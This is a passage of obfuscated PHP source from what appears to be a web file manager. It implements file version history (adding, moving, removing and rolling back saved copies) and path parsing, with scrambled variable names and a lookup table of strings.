self::unzipErrorCheck($ÙË‰ôğÂ, array($èøÜ¹Ì[1264], $º¤º–Ì, $®Ë—Ô£ğ, $§ù¾èŸì, $¨„ÜÉî)); if (IO::exist($Ÿî€éô¤)) { IO::rename($Ÿî€éô¤, get_path_this($¨„ÜÉî)); } $Ú·ÌÈ¹ó = $¨„ÜÉî; } $ÛíÂ õß = $Ú·ÌÈ¹ó; return array($èøÜ¹Ì[221] => $Ú·ÌÈ¹ó, $èøÜ¹Ì[1242] => $®Ë—Ô£ğ, $èøÜ¹Ì[1244] => $óûŒì™ó); } private static function unzipErrorCheck($Áö¦»¯, $²½ê±©ç = false) { $™Ş¹Ğ§ =& $_SERVER[º·Ï‹¥³]; if ($Áö¦»¯[$™Ş¹Ğ§[1265]]) { return !0; } write_log(array($™Ş¹Ğ§[1266], $Áö¦»¯, $²½ê±©ç), $™Ş¹Ğ§[1267]); show_json($™Ş¹Ğ§[1268] . json_encode($Áö¦»¯[$™Ş¹Ğ§[1255]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ñØÙ€Ë =& $_SERVER[º·Ï‹¥³]; $ø¤˜Á  = $GLOBALS[$ñØÙ€Ë[6]][$ñØÙ€Ë[92]]; if ($ø¤˜Á [$ñØÙ€Ë[1269]] != 1) { return; } if ($ø¤˜Á [$ñØÙ€Ë[1270]] <= 0) { return; } if (isset($_REQUEST[$ñØÙ€Ë[1271]]) && $_REQUEST[$ñØÙ€Ë[1271]] == $ñØÙ€Ë[91]) { return; } Hook::bind($ñØÙ€Ë[1272], $ñØÙ€Ë[1273]); Hook::bind($ñØÙ€Ë[1274], $ñØÙ€Ë[1275]); Hook::bind($ñØÙ€Ë[1276], $ñØÙ€Ë[1277]); Hook::bind($ñØÙ€Ë[1278], $ñØÙ€Ë[1279]); Hook::bind($ñØÙ€Ë[1280], $ñØÙ€Ë[1281]); Hook::bind($ñØÙ€Ë[1282], $ñØÙ€Ë[1283]); } public static function eventBeforeUpload($ã¿ğªÀ™) { if ($ã¿ğªÀ™[3] && $ã¿ğªÀ™[3] != REPEAT_REPLACE) { return; } $¯ØÆ†ÙÛ = self::parsePath($ã¿ğªÀ™[0]); if (!$¯ØÆ†ÙÛ) { return; } self::add($¯ØÆ†ÙÛ); } public static function eventBeforeEdit($€Ïíâ–) { $›Î’ñÀÈ = self::parsePath($€Ïíâ–[0]); if (!$›Î’ñÀÈ) { return; } self::add($›Î’ñÀÈ); } public static function eventBeforeCopyFile($ìÂÜÎ³, $‘ù©º°‘, $·«©ÁĞ§, $Îñö‚Óí, $ºòÒÛ, $ûùÒ˜±İ) { $Äæº–½å =& $_SERVER[º·Ï‹¥³]; if (isset($·«©ÁĞ§->_data[$Äæº–½å[1207]]) && $·«©ÁĞ§->_data[$Äæº–½å[1207]]) { return; } $Ä»Ï•óë = $·«©ÁĞ§->getPathOuter($Îñö‚Óí); $–Œîªßµ = self::parsePath($Ä»Ï•óë); if (!$–Œîªßµ) { return; } self::add($–Œîªßµ); } public static function eventBeforeRename($ãñÉˆ«) { $¶¯§¾‹› =& $_SERVER[º·Ï‹¥³]; $ôóéšÁÌ = self::parsePath($ãñÉˆ«[0]); if (!$ôóéšÁÌ) { return; } $´¥Ùúí… = self::checkInHistory($ôóéšÁÌ); if (!$´¥Ùúí…) { return; } if ($´¥Ùúí…[$¶¯§¾‹›[33]] == $¶¯§¾‹›[221]) { $Ä’ıÒïÖ = self::listData($ôóéšÁÌ); if ($Ä’ıÒïÖ && $Ä’ıÒïÖ[$¶¯§¾‹›[429]]) { self::moveHistory($ôóéšÁÌ, $ãñÉˆ«[1]); } } else { IO::rename($´¥Ùúí…[$¶¯§¾‹›[87]], $ãñÉˆ«[1]); } } public static function eventBeforeMove($¬ïŒğã) { $–ãïêô° =& $_SERVER[º·Ï‹¥³]; $İö¹óÃì = self::parsePath($¬ïŒğã[0]); if (!$İö¹óÃì) { return; } $ò²¸±øê = self::parsePath($¬ïŒğã[1]); if (!$ò²¸±øê) { return; } $®áªğæÛ = $¬ïŒğã[3]; $ä»ÑÎ³œ = self::checkInHistory($İö¹óÃì); if (!$ä»ÑÎ³œ) { return; } $®ËûöëÙ = self::pathHistory($ò²¸±øê); if ($ä»ÑÎ³œ[$–ãïêô°[33]] == $–ãïêô°[221]) { $àã”î¶Ì = self::listData($İö¹óÃì); $ş·»áîè = rtrim($ò²¸±øê, $–ãïêô°[8]) . $–ãïêô°[8] . ($®áªğæÛ ? $®áªğæÛ : get_path_this($İö¹óÃì)); $Æ×¾ş‹Å = self::listData($ş·»áîè); if ($àã”î¶Ì && $àã”î¶Ì[$–ãïêô°[429]] && $Æ×¾ş‹Å && $Æ×¾ş‹Å[$–ãïêô°[429]]) { return self::clear($İö¹óÃì); } if ($àã”î¶Ì && $àã”î¶Ì[$–ãïêô°[429]]) { self::moveHistory($İö¹óÃì, $®áªğæÛ, $®ËûöëÙ); } } else { IO::move($ä»ÑÎ³œ[$–ãïêô°[87]], $®ËûöëÙ, !1, $®áªğæÛ); self::clearEmptyFolder(IO::pathFather($ä»ÑÎ³œ[$–ãïêô°[87]])); } } public static function eventAfterRemove($ÏÙ‹£ÁÆ, $¹Äñš€) { $ººº“Ÿá =& $_SERVER[º·Ï‹¥³]; if (!$¹Äñš€) { return; } $–Ç•ü³é = self::parsePath($ÏÙ‹£ÁÆ[0]); if (!$–Ç•ü³é) { return; } $Áà‰Àí = self::checkInHistory($–Ç•ü³é); if (!$Áà‰Àí) { return; } if ($Áà‰Àí[$ººº“Ÿá[33]] == $ººº“Ÿá[221]) { $ù÷óãÜÈ = self::listData($–Ç•ü³é, !1); if ($ù÷óãÜÈ && $ù÷óãÜÈ[$ººº“Ÿá[429]]) { self::clear($–Ç•ü³é, !1); } } else { IO::remove($Áà‰Àí[$ººº“Ÿá[87]]); self::clearEmptyFolder(IO::pathFather($Áà‰Àí[$ººº“Ÿá[87]])); } } private static function checkInHistory($ç»“§”Ö) { $¼¢–ŞÁ§ = self::pathHistory($ç»“§”Ö); if (!IO::exist($¼¢–ŞÁ§)) { $¼¢–ŞÁ§ .= $_SERVER[º·Ï‹¥³][1284]; } return IO::exist($¼¢–ŞÁ§) ? IO::info($¼¢–ŞÁ§) : !1; } private static function parsePath($çÆÙà¯») { $¸Èù®©â =& $_SERVER[º·Ï‹¥³]; if (!$çÆÙà¯») { return !1; } if (isset($GLOBALS[$¸Èù®©â[1285]]) && $GLOBALS[$¸Èù®©â[1285]]) { return; } $æ¾¹˜›± = KodIO::parse($çÆÙà¯»); $³Êîš–× = $æ¾¹˜›±[$¸Èù®©â[33]]; $ÂÒ¥Ü˜Ï = !$³Êîš–× || $³Êîš–× == KodIO::KOD_IO || $³Êîš–× == KodIO::KOD_SHARE_ITEM; if (!$ÂÒ¥Ü˜Ï || !$æ¾¹˜›±[$¸Èù®©â[1286]]) { return !1; } if (substr($çÆÙà¯», 0, strlen(DATA_PATH . $¸Èù®©â[1287])) == DATA_PATH . $¸Èù®©â[1287]) { return !1; } if ($³Êîš–× == KodIO::KOD_SHARE_ITEM) { $Ûœè¾Ú = IO::init($çÆÙà¯»); if ($Ûœè¾Ú->pathParse[$¸Èù®©â[1203]]) { return self::parsePath($Ûœè¾Ú->pathParse[$¸Èù®©â[1203]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $éìîŸ°İ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¸Èù®©â[1288]); foreach ($éìîŸ°İ as $×ã¥¬¹­) { if (!$³Êîš–× && substr($çÆÙà¯», 0, strlen($×ã¥¬¹­)) == $×ã¥¬¹­) { return !1; } } self::log($GLOBALS[$¸Èù®©â[1198]] . $¸Èù®©â[1289] . $çÆÙà¯»); return $çÆÙà¯»; } private static function pathHistory($¢¾›úÖ) { $“ó•É‡Î =& $_SERVER[º·Ï‹¥³]; $“‰Â‹› = self::$_historyBase . ltrim(KodIO::clear($¢¾›úÖ), $“ó•É‡Î[8]); $“‰Â‹› = str_replace(array($“ó•É‡Î[1290]), array($“ó•É‡Î[1291]), $“‰Â‹›); return $“‰Â‹›; } public static function log($‚Û¢ìµ) { } public static function historyCount($Á”†¾ªà) { $«±ÌúîË =& $_SERVER[º·Ï‹¥³]; $Ÿ™Èæ±‹ = array(); $ßÂÒàã = array(); foreach ($Á”†¾ªà as $ğï¿¹–ş) { $µâğ¤ÓÔ = get_path_father($ğï¿¹–ş); if (!$ßÂÒàã[$µâğ¤ÓÔ]) { $ßÂÒàã[$µâğ¤ÓÔ] = array(); } $ßÂÒàã[$µâğ¤ÓÔ][] = get_path_this($ğï¿¹–ş); } foreach ($ßÂÒàã as $µâğ¤ÓÔ => $ŒòˆÉ¢Í) { $×­µÉò³ = self::parsePath($µâğ¤ÓÔ); if (!$×­µÉò³) { continue; } foreach ($ŒòˆÉ¢Í as $İÅúŒú§) { $ªÏü¡ˆœ = self::listData(rtrim($×­µÉò³, $«±ÌúîË[8]) . $«±ÌúîË[8] . $İÅúŒú§, !1); if ($ªÏü¡ˆœ && $ªÏü¡ˆœ[$«±ÌúîË[429]]) { $Ÿ™Èæ±‹[rtrim($µâğ¤ÓÔ, $«±ÌúîË[8]) . $«±ÌúîË[8] . $İÅúŒú§] = count($ªÏü¡ˆœ[$«±ÌúîË[429]]); } } } return $Ÿ™Èæ±‹; } public static function add($¡—Ş‚) { $ıØ­—ñ© =& $_SERVER[º·Ï‹¥³]; $ş¼’ä‘‚ = self::listData($¡—Ş‚); if (!$ş¼’ä‘‚) { return; } $ÆÙ¸÷¬¡ = Model($ıØ­—ñ©[822])->get($ıØ­—ñ©[1292]); $ÄÔÌ·ÜĞ = intval($GLOBALS[$ıØ­—ñ©[6]][$ıØ­—ñ©[92]][$ıØ­—ñ©[1270]]); $„È©ğ = $ÆÙ¸÷¬¡ == $ıØ­—ñ©[1293] ? min(5, $ÄÔÌ·ÜĞ) : $ÄÔÌ·ÜĞ; if ($ÄÔÌ·ÜĞ <= 0) { return; } $‹³„¡ÆÅ = IO::info($¡—Ş‚); $¹À¼úĞÂ = $ş¼’ä‘‚[$ıØ­—ñ©[429]]; if ($‹³„¡ÆÅ[$ıØ­—ñ©[79]] == 0) { return; } if ($‹³„¡ÆÅ[$ıØ­—ñ©[79]] >= 1024 * 1024 * 500) { return !1; } $¨Æë‘­ğ = IO::hashSimple($¡—Ş‚); if ($¹À¼úĞÂ && $¹À¼úĞÂ[0][$ıØ­—ñ©[656]] == $¨Æë‘­ğ) { return !0; } if (array_key_exists($ıØ­—ñ©[224], $‹³„¡ÆÅ) && !$‹³„¡ÆÅ[$ıØ­—ñ©[224]]) { return !1; } $ƒ¤øê¥ù = short_id(time()); $Çû¸ØÇí = array($ıØ­—ñ©[459] => $ƒ¤øê¥ù, $ıØ­—ñ©[656] => $¨Æë‘­ğ, $ıØ­—ñ©[32] => $‹³„¡ÆÅ[$ıØ­—ñ©[32]] . $ıØ­—ñ©[10] . date($ıØ­—ñ©[1294]) . rand_string(1), $ıØ­—ñ©[79] => $‹³„¡ÆÅ[$ıØ­—ñ©[79]], $ıØ­—ñ©[511] => USER_ID, $ıØ­—ñ©[222] => time(), $ıØ­—ñ©[1295] => $ıØ­—ñ©[12]); IO::mkdir($ş¼’ä‘‚[$ıØ­—ñ©[1296]]); $§ƒ£é–™ = IO::copy($¡—Ş‚, $ş¼’ä‘‚[$ıØ­—ñ©[1296]], !1, $Çû¸ØÇí[$ıØ­—ñ©[32]]); if (!$§ƒ£é–™) { self::clearEmptyFolder($ş¼’ä‘‚[$ıØ­—ñ©[1296]]); return !1; } array_unshift($¹À¼úĞÂ, $Çû¸ØÇí); if (count($¹À¼úĞÂ) > $„È©ğ) { $€û¹·â“ = array_slice($¹À¼úĞÂ, $„È©ğ); foreach ($€û¹·â“ as $ÈŒ‡ç’) { IO::remove($ş¼’ä‘‚[$ıØ­—ñ©[1296]] . $ÈŒ‡ç’[$ıØ­—ñ©[32]]); } $¹À¼úĞÂ = array_slice($¹À¼úĞÂ, 0, $„È©ğ); } return self::saveData($ş¼’ä‘‚[$ıØ­—ñ©[1297]], $¹À¼úĞÂ); } public static function remove($íÂøÃ´Ì, $”÷É¨‹à) { $ÊıïÒ²Œ =& $_SERVER[º·Ï‹¥³]; $äŒŒ€¨Ú = self::listData($íÂøÃ´Ì); $šŸƒõ¥Ø = array(); if (!$äŒŒ€¨Ú) { return !1; } foreach ($äŒŒ€¨Ú[$ÊıïÒ²Œ[429]] as $÷èÔÕŸµ) { if ($÷èÔÕŸµ[$ÊıïÒ²Œ[459]] == $”÷É¨‹à) { IO::remove($äŒŒ€¨Ú[$ÊıïÒ²Œ[1296]] . $÷èÔÕŸµ[$ÊıïÒ²Œ[32]]); continue; } $šŸƒõ¥Ø[] = $÷èÔÕŸµ; } return self::saveData($äŒŒ€¨Ú[$ÊıïÒ²Œ[1297]], $šŸƒõ¥Ø); } public static function clear($ŞÆ„Øüı, $¶®Ï¾Óƒ = true) { $’Å¦ƒš‘ =& $_SERVER[º·Ï‹¥³]; $ÕÛÃ‰×× = self::listData($ŞÆ„Øüı, $¶®Ï¾Óƒ); if (!$ÕÛÃ‰××) { return !1; } foreach ($ÕÛÃ‰××[$’Å¦ƒš‘[429]] as $äÓÇ¢½Œ) { IO::remove($ÕÛÃ‰××[$’Å¦ƒš‘[1296]] . $äÓÇ¢½Œ[$’Å¦ƒš‘[32]]); } return self::saveData($ÕÛÃ‰××[$’Å¦ƒš‘[1297]], array()); } public static function moveHistory($É¤–Œ í, $ÌáÔá½ù = '', $ÖÃ‚ãË‰ = '') { $ü«¤â£ =& $_SERVER[º·Ï‹¥³]; $…¬á¥§è = self::listData($É¤–Œ í, !1); if (!$…¬á¥§è || !$…¬á¥§è[$ü«¤â£[429]]) { return !1; } $çŒÍâ¿„ = $ü«¤â£[1284]; $ÌáÔá½ù = $ÌáÔá½ù ? $ÌáÔá½ù : get_path_this($É¤–Œ í); $ÖÃ‚ãË‰ = $ÖÃ‚ãË‰ ? $ÖÃ‚ãË‰ : $…¬á¥§è[$ü«¤â£[1296]]; $ü§›Ïş¿ = substr(get_path_this($…¬á¥§è[$ü«¤â£[1297]]), 0, -strlen($çŒÍâ¿„)); foreach ($…¬á¥§è[$ü«¤â£[429]] as $ïÍçšåõ => $š¿Û¥Óğ) { $ŸáúÈ…ş = $ÌáÔá½ù . substr($š¿Û¥Óğ[$ü«¤â£[32]], strlen($ü§›Ïş¿)); $š—¶–ë° = IO::move($…¬á¥§è[$ü«¤â£[1296]] . $š¿Û¥Óğ[$ü«¤â£[32]], $ÖÃ‚ãË‰, !1, $ŸáúÈ…ş); if ($š—¶–ë°) { $…¬á¥§è[$ü«¤â£[429]][$ïÍçšåõ][$ü«¤â£[32]] = $ŸáúÈ…ş; } } $…¬á¥§è[$ü«¤â£[1297]] = IO::move($…¬á¥§è[$ü«¤â£[1297]], $ÖÃ‚ãË‰, !1, $ÌáÔá½ù . $çŒÍâ¿„); self::saveData($…¬á¥§è[$ü«¤â£[1297]], $…¬á¥§è[$ü«¤â£[429]]); self::clearEmptyFolder($…¬á¥§è[$ü«¤â£[1296]]); } public static function rollback($ìŒ¬“ÄË, $š½ë¾ã€) { $“ÈÏßÈ´ =& $_SERVER[º·Ï‹¥³]; $ÚšïöËë = self::listData($ìŒ¬“ÄË); if (!$ÚšïöËë) { return; } $Ñù¥˜©à = IO::info($ìŒ¬“ÄË); foreach ($ÚšïöËë[$“ÈÏßÈ´[429]] as $÷¯õ»è => $¤š¾êûŒ) { if ($¤š¾êûŒ[$“ÈÏßÈ´[459]] == $š½ë¾ã€) { self::add($ìŒ¬“ÄË); $¸¶Áêíù = $ÚšïöËë[$“ÈÏßÈ´[1296]] . $¤š¾êûŒ[$“ÈÏßÈ´[32]]; $Ñ™çŞª» = IO::copy($¸¶Áêíù, IO::pathFather($ìŒ¬“ÄË), REPEAT_REPLACE, $Ñù¥˜©à[$“ÈÏßÈ´[32]]); if ($Ñ™çŞª») { self::remove($ìŒ¬“ÄË, $š½ë¾ã€); } return $Ñ™çŞª»; } } return !1; } public static function setDetail($¹ ¢Â·û, $é·´‰İ, $ŞíÒæ„ ) { $®›ÈîŒµ =& $_SERVER[º·Ï‹¥³]; $û‰ÓÕˆ = self::listData($¹ ¢Â·û); if (!$û‰ÓÕˆ) { return; } foreach ($û‰ÓÕˆ[$®›ÈîŒµ[429]] as $ììıâı§ => $Ó³æ€â£) { if ($Ó³æ€â£[$®›ÈîŒµ[459]] == $é·´‰İ) { $û‰ÓÕˆ[$®›ÈîŒµ[429]][$ììıâı§][$®›ÈîŒµ[1295]] = $ŞíÒæ„ ; self::saveData($û‰ÓÕˆ[$®›ÈîŒµ[1297]], $û‰ÓÕˆ[$®›ÈîŒµ[429]]); return !0; } } return !1; } public static function fileInfo($òáÁºÀà, $‡ŸÑÈ³Á) { $êß·âÕ° =& $_SERVER[º·Ï‹¥³]; $åõçÆÏ  = self::listData($òáÁºÀà); if (!$åõçÆÏ ) { show_json(LNG($êß·âÕ°[108]), !1); } $âö“·£ö = $êß·âÕ°[12]; foreach ($åõçÆÏ [$êß·âÕ°[429]] as $ŠŒŸÍ² => $Íã§•¸) { if ($Íã§•¸[$êß·âÕ°[459]] != $‡ŸÑÈ³Á) { continue; } $âö“·£ö = $åõçÆÏ [$êß·âÕ°[1296]] . $Íã§•¸[$êß·âÕ°[32]]; break; } if (!$âö“·£ö) { show_json(LNG($êß·âÕ°[108]), !1); } return IO::info($âö“·£ö); } public static function fileOut($æº«éÖƒ, $õûûºÕ·, $¥ ”ôøö = false) { $¤•Øğ·™ =& $_SERVER[º·Ï‹¥³]; $£¤üÏ™× = self::fileInfo($æº«éÖƒ, $õûûºÕ·); $ö²¦¨ó« =& $GLOBALS[$¤•Øğ·™[7]]; $¥ ”ôøö = isset($ö²¦¨ó«[$¤•Øğ·™[1247]]) && $ö²¦¨ó«[$¤•Øğ·™[1247]] == 1; if (isset($ö²¦¨ó«[$¤•Øğ·™[33]]) && $ö²¦¨ó«[$¤•Øğ·™[33]] == $¤•Øğ·™[1298]) { return IO::fileOutImage($£¤üÏ™×[$¤•Øğ·™[87]], $ö²¦¨ó«[$¤•Øğ·™[1299]]); } IO::fileOut($£¤üÏ™×[$¤•Øğ·™[87]], $¥ ”ôøö, get_path_this($æº«éÖƒ)); } public static function listData($È‰‹îâÄ, $Œê‚Ê¬¹ = true) { $€í’¤Êè =& $_SERVER[º·Ï‹¥³]; if ($Œê‚Ê¬¹ && !IO::exist($È‰‹îâÄ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($È‰‹îâÄ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $…ğ¥í¬ = self::pathHistory($È‰‹îâÄ); $ö¶·¦ùğ = array($€í’¤Êè[1297] => $…ğ¥í¬ . $€í’¤Êè[1284], $€í’¤Êè[1296] => rtrim(get_path_father($…ğ¥í¬), $€í’¤Êè[8]) . $€í’¤Êè[8], $€í’¤Êè[429] => array()); $‰ËûşÁø = IO::getContent($ö¶·¦ùğ[$€í’¤Êè[1297]]); if ($‰ËûşÁø) { $ÍšŠîğ³ = json_decode($‰ËûşÁø, !0); if (is_array($ÍšŠîğ³)) { $ö¶·¦ùğ[$€í’¤Êè[429]] = $ÍšŠîğ³; } } return $ö¶·¦ùğ; } private static function saveData($ÖÛŒµŠ›, $¤³€¥Âù) { $ëÀ ¢Ìè =& $_SERVER[º·Ï‹¥³]; self::log($ëÀ ¢Ìè[1300] . $ÖÛŒµŠ› . $ëÀ ¢Ìè[74] . count($¤³€¥Âù), $ëÀ ¢Ìè[803]); if ($¤³€¥Âù) { return IO::setContent($ÖÛŒµŠ›, json_encode($¤³€¥Âù)); } $•¢ğ‹§í = IO::pathFather($ÖÛŒµŠ›); IO::remove($ÖÛŒµŠ›); self::clearEmptyFolder($•¢ğ‹§í); return !0; } public static function clearEmptyFolder($¾Š½˜ ú) { $›úö§ş£ =& $_SERVER[º·Ï‹¥³]; if (trim($¾Š½˜ ú, $›úö§ş£[8]) == trim(self::$_historyBase, $›úö§ş£[8])) { return; } $Î½§ïŸÂ = IO::pathFather($¾Š½˜ ú); $Æ¶¼º— = IO::has($¾Š½˜ ú, !0); if ($Æ¶¼º—[$›úö§ş£[230]] > 0 || $Æ¶¼º—[$›úö§ş£[231]] > 0) { return; } IO::remove($¾Š½˜ ú); self::clearEmptyFolder($Î½§ïŸÂ); } private static function getBasePath() { $ÀıÚİ‰ =& $_SERVER[º·Ï‹¥³]; $¨Ş¤âÌ• = Model($ÀıÚİ‰[1301])->get($ÀıÚİ‰[1302]); if ($¨Ş¤âÌ•) { if (!IO::exist($¨Ş¤âÌ•)) { IO::mkdir($¨Ş¤âÌ•); } if (get_path_this($¨Ş¤âÌ•) == $ÀıÚİ‰[1287]) { $ÄÓÔŒì¡ = $ÀıÚİ‰[1303] . rand_string(8); @rename($¨Ş¤âÌ•, get_path_father($¨Ş¤âÌ•) . $ÀıÚİ‰[8] . $ÄÓÔŒì¡); $¨Ş¤âÌ• = DATA_PATH . $ÄÓÔŒì¡ . $ÀıÚİ‰[8]; file_put_contents(DATA_PATH . $ÀıÚİ‰[1237], $ÀıÚİ‰[12]); Model($ÀıÚİ‰[1301])->set($ÀıÚİ‰[1302], $¨Ş¤âÌ•); } return $¨Ş¤âÌ•; } $¨Ş¤âÌ• = DATA_PATH . $ÀıÚİ‰[1303] . rand_string(8) . $ÀıÚİ‰[8]; $¨Ş¤âÌ• = IO::mkdir($¨Ş¤âÌ•); $¨Ş¤âÌ• = rtrim($¨Ş¤âÌ•, $ÀıÚİ‰[8]) . $ÀıÚİ‰[8]; file_put_contents($¨Ş¤âÌ• . $ÀıÚİ‰[1237], $ÀıÚİ‰[12]); file_put_contents(DATA_PATH . $ÀıÚİ‰[1237], $ÀıÚİ‰[12]); Model($ÀıÚİ‰[1301])->set($ÀıÚİ‰[1302], $¨Ş¤âÌ•); return $¨Ş¤âÌ•; } } class KodIO { const KOD_SOURCE = "\173\x73\157\x75\x72\143\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\162\122\145\x63\x79\143\x6c\145\175"; const KOD_USER_FAV = "\173\x75\163\145\162\x46\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\145\x72\106\151\154\145\x54\141\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\x72\x46\151\x6c\145\124\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\x75\x70\x52\157\x6f\x74\x53\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\145\x72\123\x68\141\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\x72\123\x68\141\x72\145\114\x69\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\x72\145\124\157\115\145\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\141\x72\145\111\164\145\155\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\x72\x65\111\164\145\x6d\114\x69\x6e\x6b\175"; const KOD_SEARCH = "\x7b\163\x65\141\162\143\x68\x7d"; const KOD_BLOCK = "\x7b\142\154\x6f\x63\x6b\175"; const KOD_IO = "\173\151\x6f\175"; const KOD_USER_RECENT = "\173\165\x73\x65\x72\x52\145\156\143\145\x6e\x74\175"; const KOD_USER_DRIVER = "\173\x64\162\151\166\145\162\x7d"; public static function typeList() { $•ãµ ¡ =& $_SERVER[º·Ï‹¥³]; return array($•ãµ ¡[1304] => self::KOD_SOURCE, $•ãµ ¡[1305] => self::KOD_USER_RECYCLE, $•ãµ ¡[1306] => self::KOD_USER_FAV, $•ãµ ¡[1307] => self::KOD_USER_FILE_TAG, $•ãµ ¡[1308] => self::KOD_USER_FILE_TYPE, $•ãµ ¡[1309] => self::KOD_GROUP_ROOT_SELF, $•ãµ ¡[1310] => self::KOD_USER_SHARE, $•ãµ ¡[1311] => self::KOD_USER_SHARE_LINK, $•ãµ ¡[1312] => self::KOD_USER_SHARE_TO_ME, $•ãµ ¡[1313] => self::KOD_SHARE_ITEM, $•ãµ ¡[1314] => self::KOD_SHARE_LINK, $•ãµ ¡[1315] => self::KOD_SEARCH, $•ãµ ¡[1316] => self::KOD_BLOCK, $•ãµ ¡[1317] => self::KOD_IO, $•ãµ ¡[1318] => self::KOD_USER_RECENT, $•ãµ ¡[1319] => self::KOD_USER_DRIVER); } public static function parse($Èôà°®´) { $‚Áú¢Å» =& $_SERVER[º·Ï‹¥³]; $Èôà°®´ = self::clear($Èôà°®´); $ıÜÚ›É = array_values(self::typeList()); preg_match($‚Áú¢Å»[1320], $Èôà°®´, $‘ŒãıÚÄ); $Æ¼ìİú = array($‚Áú¢Å»[480] => !1, $‚Áú¢Å»[1321] => !1, $‚Áú¢Å»[477] => !1, $‚Áú¢Å»[87] => $Èôà°®´, $‚Áú¢Å»[1222] => !1, $‚Áú¢Å»[1221] => $‚Áú¢Å»[12]); if (is_array($‘ŒãıÚÄ) && count($‘ŒãıÚÄ) == 5) { $Šİ™’¤ = $‚Áú¢Å»[1322] . $‘ŒãıÚÄ[2] . $‚Áú¢Å»[378]; if (in_array($Šİ™’¤, $ıÜÚ›É)) { $Æ¼ìİú[$‚Áú¢Å»[1222]] = $‘ŒãıÚÄ[1]; $Æ¼ìİú[$‚Áú¢Å»[33]] = $Šİ™’¤; $Æ¼ìİú[$‚Áú¢Å»[1323]] = substr($Šİ™’¤, 1, -1); $Æ¼ìİú[$‚Áú¢Å»[459]] = $‘ŒãıÚÄ[3]; } $Æ¼ìİú[$‚Áú¢Å»[1221]] = $‘ŒãıÚÄ[4]; } $ò²›äÕù = array($‚Áú¢Å»[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Æ¼ìİú[$‚Áú¢Å»[1286]] = in_array($Æ¼ìİú[$‚Áú¢Å»[33]], $ò²›äÕù); return $Æ¼ìİú; } public static function isTruePath($ˆ à«–¨) { $È¯§˜˜Î =& $_SERVER[º·Ï‹¥³]; if (substr($ˆ à«–¨, 0, 1) != $È¯§˜˜Î[1322]) { return !0; } if (strpos($ˆ à«–¨, $È¯§˜˜Î[467]) === 0) { return !0; } if (strpos($ˆ à«–¨, $È¯§˜˜Î[1290]) === 0) { return !0; } if (strpos($ˆ à«–¨, $È¯§˜˜Î[1324]) === 0) { return !0; } if (strpos($ˆ à«–¨, $È¯§˜˜Î[1325]) === 0) { return !0; } if (strpos($ˆ à«–¨, $È¯§˜˜Î[1326]) === 0) { return !0; } return !1; } public static function clear($Ôó©œÌ¡) { $Ö¦Ò ¿¾ =& $_SERVER[º·Ï‹¥³]; $Ôó©œÌ¡ = str_replace(array($Ö¦Ò ¿¾[1128], $Ö¦Ò ¿¾[253]), $Ö¦Ò ¿¾[53], $Ôó©œÌ¡); $Ôó©œÌ¡ = str_replace($Ö¦Ò ¿¾[100], $Ö¦Ò ¿¾[8], $Ôó©œÌ¡); $ ¿ï¡ = $Ö¦Ò ¿¾[1327]; if (substr($Ôó©œÌ¡, 0, 3) == $Ö¦Ò ¿¾[1328]) { $Ôó©œÌ¡ = substr($Ôó©œÌ¡, 3); } while (strstr($Ôó©œÌ¡, $ ¿ï¡)) { $Ôó©œÌ¡ = str_replace($ ¿ï¡, $Ö¦Ò ¿¾[8], $Ôó©œÌ¡); } $Ôó©œÌ¡ = preg_replace($Ö¦Ò ¿¾[1329], $Ö¦Ò ¿¾[8], $Ôó©œÌ¡); if ($Ôó©œÌ¡ == $Ö¦Ò ¿¾[8]) { return $Ö¦Ò ¿¾[8]; } $Ôó©œÌ¡ = rtrim($Ôó©œÌ¡, $Ö¦Ò ¿¾[8]); return $Ôó©œÌ¡; } public static function pathTrue($°Úïäó‘) { $Ïı«ÉÜ› =& $_SERVER[º·Ï‹¥³]; if (!$°Úïäó‘) { return $Ïı«ÉÜ›[12]; } $°Úïäó‘ = str_replace($Ïı«ÉÜ›[577], $Ïı«ÉÜ›[8], str_replace($Ïı«ÉÜ›[1330], $Ïı«ÉÜ›[8], $°Úïäó‘)); $°Úïäó‘ = str_replace($Ïı«ÉÜ›[577], $Ïı«ÉÜ›[8], str_replace($Ïı«ÉÜ›[1330], $Ïı«ÉÜ›[8], $°Úïäó‘)); if (!strstr($°Úïäó‘, $Ïı«ÉÜ›[1328])) { return $°Úïäó‘; } $’™˜° = explode($Ïı«ÉÜ›[8], $°Úïäó‘); foreach ($’™˜° as $£ëÜ®Œ× => $‚ØİøÆˆ) { if ($‚ØİøÆˆ !== $Ïı«ÉÜ›[1331]) { continue; } for ($©Ï¸îë– = $£ëÜ®Œ×; $©Ï¸îë– >= 0; $©Ï¸îë–--) { if ($’™˜°[$©Ï¸îë–] === $Ïı«ÉÜ›[10] || $’™˜°[$©Ï¸îë–] === $Ïı«ÉÜ›[1331] || $’™˜°[$©Ï¸îë–] === -1) { continue; } if ($’™˜°[$©Ï¸îë–] === $Ïı«ÉÜ›[12]) { $’™˜°[$£ëÜ®Œ×] = -1; break; } $’™˜°[$£ëÜ®Œ×] = -1; $’™˜°[$©Ï¸îë–] = -1; break; } } $„¶Ç‡Ú = array(); foreach ($’™˜° as $‚ØİøÆˆ) { if ($‚ØİøÆˆ !== -1) { $„¶Ç‡Ú[] = $‚ØİøÆˆ; } } $Üï­ŞÆ = implode($Ïı«ÉÜ›[8], $„¶Ç‡Ú); if (strpos($Üï­ŞÆ, $Ïı«ÉÜ›[1332]) === 0) { $Üï­ŞÆ = $Ïı«ÉÜ›[1328] . substr($Üï­ŞÆ, strlen($Ïı«ÉÜ›[1332])); } return $Üï­ŞÆ; } public static function 